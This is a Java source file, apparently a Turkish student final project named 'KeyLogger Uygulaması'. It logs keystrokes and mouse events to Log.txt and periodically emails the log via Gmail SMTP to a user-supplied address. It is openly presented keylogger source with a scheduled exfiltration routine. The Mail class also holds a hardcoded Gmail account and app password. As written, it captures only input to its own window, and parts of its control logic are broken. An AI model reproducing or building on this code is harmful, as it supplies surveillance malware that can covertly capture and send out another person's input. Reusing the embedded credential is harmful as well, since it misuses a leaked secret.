import java.awt.*;
import java.awt.event.*;
import java.io.*;
import java.awt.BorderLayout;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;
import java.io.IOException;
import java.util.Properties;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.swing.*;

public class Main {
    public static void main(String[] args) {
        Arayüz arayuznesnesi = new Arayüz();
        arayuznesnesi.arayuz();
    }
}

class Arayüz extends JFrame implements ItemListener, KeyListener, MouseListener {

    private JCheckBox fare, klavye, herikisi;
    public static int max;
    public static Long boyut=0L;
    private boolean isRunning = false; //Durdurmak için bayrak değişkeni
    private ScheduledExecutorService executorService;

    public void arayuz() {

        JFrame frame = new JFrame("KeyLogger Uygulaması");
        JButton durdurbuton = new JButton("Durdur");
        JButton baslatbuton = new JButton("Başlat");
        frame.addMouseListener(this);

        fare = new JCheckBox("Sadece fare");
        fare.addItemListener(this);
        klavye = new JCheckBox("Sadece klavye");
        klavye.addItemListener(this);
        herikisi = new JCheckBox("Her ikisi");
        herikisi.addItemListener(this);

        final JTextField txtaralik = new JTextField(" ");
        txtaralik.addKeyListener(this);
        final JTextField txtmail = new JTextField(" ");
        txtmail.addKeyListener(this);
        final JTextField txtboyut = new JTextField(" ");
        txtboyut.addKeyListener(this);
        JLabel lblaralik = new JLabel("Mail gönderme aralıkları dk:");
        JLabel lblmail = new JLabel("Gönderilecek mail hesabı:");
        JLabel lblboyut = new JLabel("Max log file boyutu MB:");

        frame.setSize(700, 350);
        frame.setLocation(200, 50);
        frame.getContentPane().add(BorderLayout.CENTER, new JTextArea(10, 40));
        lblaralik.setBounds(34, 49, 250, 18);
        lblmail.setBounds(34, 89, 250, 18);
        lblboyut.setBounds(34, 129, 250, 18);
        txtaralik.setBounds(200, 49, 160, 20);
        txtmail.setBounds(200, 89, 160, 20);
        txtboyut.setBounds(200, 129, 160, 20);
        durdurbuton.setBounds(50, 200, 95, 40);
        baslatbuton.setBounds(200, 200, 95, 40);
        fare.setBounds(450, 50, 100, 30);
        klavye.setBounds(450, 100, 150, 30);
        herikisi.setBounds(450, 150, 100, 30);


        frame.add(baslatbuton);
        frame.add(durdurbuton);
        frame.setLayout(new FlowLayout());
        frame.add(lblaralik);
        frame.add(lblmail);
        frame.add(lblboyut);
        frame.add(txtaralik);
        frame.add(txtmail);
        frame.add(txtboyut);
        frame.add(fare);
        frame.add(klavye);
        frame.add(herikisi);

        frame.setLayout(null);
        frame.setVisible(true);

        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);


        String dosyaAdi = "Log.txt";

        try {
            File dosya = new File(dosyaAdi);

            if (dosya.createNewFile()) {
                System.out.println("Dosya oluşturuldu: " + dosya.getName());
            } else {
                System.out.println("Dosya zaten mevcut.");
            }
        } catch (IOException e) {
            System.out.println("Dosya oluşturulurken bir hata oluştu.");
            e.printStackTrace();
        }



        durdurbuton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (isRunning) {
                    isRunning = false;
                    executorService.shutdownNow();
                    durdurbuton.setText("Durduruldu"); // Durdurulduğunda düğme metnini "Durduruldu" olarak güncelledik
                } else {
                    String email = txtmail.getText();
                    isRunning = true;
                    executorService = Executors.newSingleThreadScheduledExecutor();
                    Runnable task = new Runnable() {
                        @Override
                        public void run() {
                            if (isRunning){
                                try { // Dosya boyutunu kontrol et ve sıfırla
                                    File logFile = new File("Log.txt");
                                    long fileSize = logFile.length();
                                    Mail.sendMail(email);
                                    if (fileSize > max) {
                                        FileWriter fileWriter = new FileWriter(logFile);
                                        fileWriter.close();
                                        System.out.println("Dosya içeriği sıfırlandı.");
                                    }
                                } catch (Exception ex) {
                                    throw new RuntimeException(ex);
                                }

                            }

                        }

                    };durdurbuton.setText("Durdur");


                }

                }
        });


        baslatbuton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (!isRunning) {
                    isRunning = true;
                    executorService = Executors.newSingleThreadScheduledExecutor();
                ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor(); //Girilen dk aralığıyla maili tekrardan yollamak için oluşturduk
                String email = txtmail.getText();
                String aralikdk = txtaralik.getText().trim();
                String maxText = txtboyut.getText().trim();
                try {
                    max = Integer.parseInt(maxText)*1024*1024; //Max değerin megabyte hali
                } catch (NumberFormatException ex) {
                    System.out.println("Hata: " + ex.getMessage());
                    max = 0;
                }
                System.out.println("Girilen max dosya boyutu: [" + maxText + "]");
                File logFile = new File("Log.txt");
                boyut = logFile.length();

                Runnable task = new Runnable() {
                    @Override
                    public void run() {
                        if (isRunning){
                        try { // Dosya boyutunu kontrol et ve sıfırla
                            File logFile = new File("Log.txt");
                            long fileSize = logFile.length();
                            Mail.sendMail(email);
                            if (fileSize > max) {
                                FileWriter fileWriter = new FileWriter(logFile);
                                fileWriter.close();
                                System.out.println("Dosya içeriği sıfırlandı.");
                            }
                        } catch (Exception ex) {
                            throw new RuntimeException(ex);
                        }

                        }

                    }
                };
                // İlk gönderimi 0 saniye sonra başlat, ardından her girilen aralık dakikasına göre tekrarla
                long initialDelay = 0;
                long interval = Integer.parseInt(aralikdk);
                TimeUnit timeUnit = TimeUnit.MINUTES;
                executorService.scheduleAtFixedRate(task, initialDelay, interval, timeUnit);
            }

                }


        });

    }


    @Override
    public void itemStateChanged(ItemEvent e) { //Checkboxda seçilen işlemlerin yapıldığı kısım
        fare.addItemListener(new ItemListener() {
            @Override
            public void itemStateChanged(ItemEvent e) {
                 fare.isSelected();

            }
        });

        klavye.addItemListener(new ItemListener() {
            @Override
            public void itemStateChanged(ItemEvent e) {
                 klavye.isSelected();

            }
        });

        herikisi.addItemListener(new ItemListener() {
            @Override
            public void itemStateChanged(ItemEvent e) {
                herikisi.isSelected();
                herikisi.isSelected();
            }
        });
    }
    private void kaydet(String veri) {
        try {
            File dosya = new File("Log.txt");

            // Dosyaya,girilen yeni veriyi ekler
            FileWriter fileWriter = new FileWriter(dosya, true);
            BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
            bufferedWriter.write(veri);
            bufferedWriter.newLine();
            bufferedWriter.close();
        } catch (IOException ex) {
            ex.printStackTrace();
        }


        }


    @Override
    public void keyTyped(KeyEvent e) {
        // Klavyeden karakter girildiğinde çağrılır
        char c = e.getKeyChar();
        // Karakteri Log.txt dosyasına kaydet
        if (herikisi.isSelected()) {
            kaydet(String.valueOf(c));
        }
        if (klavye.isSelected()) {
            kaydet(String.valueOf(c));
        }
    }

    @Override
    public void keyPressed(KeyEvent e) {
        //İstersek bu fonksiyonda klavyenin diğer işlemlerini görüntüleyebiliriz
    }

    @Override
    public void keyReleased(KeyEvent e) {
        //İstersek bu fonksiyonda klavyenin diğer işlemlerini görüntüleyebiliriz
    }

    @Override
    public void mouseClicked(MouseEvent e) {
        int x = e.getX();
        int y = e.getY();
        if (herikisi.isSelected()) {
            kaydet("Mouse tıklandı: x=" + x + ", y=" + y);
        }
        if (fare.isSelected()) {
            kaydet("Mouse tıklandı: x=" + x + ", y=" + y);
        }

    }

    @Override
    public void mousePressed(MouseEvent e) {
        int x = e.getX();
        int y = e.getY();
        if (herikisi.isSelected()) {
            kaydet("Mouse basıldı: x=" + x + ", y=" + y);
        }
        if (fare.isSelected()) {
            kaydet("Mouse basıldı: x=" + x + ", y=" + y);
        }
    }

    @Override
    public void mouseReleased(MouseEvent e) {
        int x = e.getX();
        int y = e.getY();
        if (herikisi.isSelected()) {
            kaydet("Mouse serbest bırakıldı: x=" + x + ", y=" + y);
        }
        if (fare.isSelected()) {
            kaydet("Mouse serbest bırakıldı: x=" + x + ", y=" + y);
        }
    }

    @Override
    public void mouseEntered(MouseEvent e) {
        int x = e.getX();
        int y = e.getY();
        if (herikisi.isSelected()) {
            kaydet("Mouse girildi: x=" + x + ", y=" + y);
        }
        if (fare.isSelected()) {
            kaydet("Mouse girildi: x=" + x + ", y=" + y);
        }
    }

    @Override
    public void mouseExited(MouseEvent e) {
        int x = e.getX();
        int y = e.getY();
        if (herikisi.isSelected()) {
            kaydet("Mouse çıkıldı: x=" + x + ", y=" + y);
        }
        if (fare.isSelected()) {
            kaydet("Mouse çıkıldı: x=" + x + ", y=" + y);
        }
    }
}
class Mail{

    public static void sendMail(String recipient) throws Exception {
        System.out.println("Mesaj göndermeye hazırlanılıyor");
        Properties properties = new Properties();
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "587");


        String myAccountEmail = ("denemevize@gmail.com"); //Maili gönderen e posta

        String password = ("xjynkhflcciemqmz"); //Maili gönderen e posta şifresi

        Session session = Session.getInstance(properties, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(myAccountEmail, password);
            }
        });

        Message message = prepareMessage(session, myAccountEmail, recipient);
        Transport.send(message);
        System.out.println("Mail başarıyla gönderildi");
    }

    private static Message prepareMessage(Session session, String myAccountEmail, String recipient) {
        try {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(myAccountEmail));
            message.setRecipient(Message.RecipientType.TO, new InternetAddress(recipient));


            String subject = ("FİNAL PROJE");

            String content = ("Dosya ektedir.");

            MimeMultipart multipart = new MimeMultipart();

            MimeBodyPart textPart = new MimeBodyPart();
            textPart.setText(content);

            MimeBodyPart attachmentPart = new MimeBodyPart();
            File file = new File("C:\\Users\\user\\eclipse-workspace\\mail gönderme\\Log.txt"); // Eklemek istediğiniz dosyanın yolu
            FileDataSource dataSource = new FileDataSource(file);
            attachmentPart.setDataHandler(new DataHandler(dataSource));
            attachmentPart.setFileName(file.getName());

            multipart.addBodyPart(textPart);
            multipart.addBodyPart(attachmentPart);

            // Mesajın konu, içerik ve eklerle birlikte ayarlanması
            message.setSubject(subject);
            message.setContent(multipart);

            return message;
        } catch (Exception ex) {
            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
        }
        return null;
    }


}